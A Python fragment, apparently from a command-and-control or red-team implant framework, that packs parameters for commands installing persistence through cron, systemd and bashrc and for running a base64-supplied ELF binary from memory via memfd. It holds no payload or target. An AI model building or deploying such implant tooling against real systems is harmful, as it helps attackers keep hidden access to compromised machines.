...
def pack_command_params(cmd_name, params):
    ...
    elif cmd_name == "persist_cron":
        pk.add_string(params.get("action", "install"))
        pk.add_string(params.get("schedule", "*/5 * * * *"))
        pk.add_string(params.get("command", ""))

    elif cmd_name == "persist_systemd":
        pk.add_string(params.get("action", "install"))
        pk.add_string(params.get("name", ""))
        pk.add_string(params.get("binary_path", ""))

    elif cmd_name == "persist_bashrc":
        pk.add_string(params.get("action", "install"))
        pk.add_string(params.get("command", ""))

    elif cmd_name == "memfd_exec":
        import base64
        elf_b64 = params.get("elf_data", "")
        if elf_b64:
            elf_raw = base64.b64decode(elf_b64)
            pk.add_bytes(elf_raw)
        else:
            pk.add_bytes(b"")
        pk.add_string(params.get("arguments", ""))
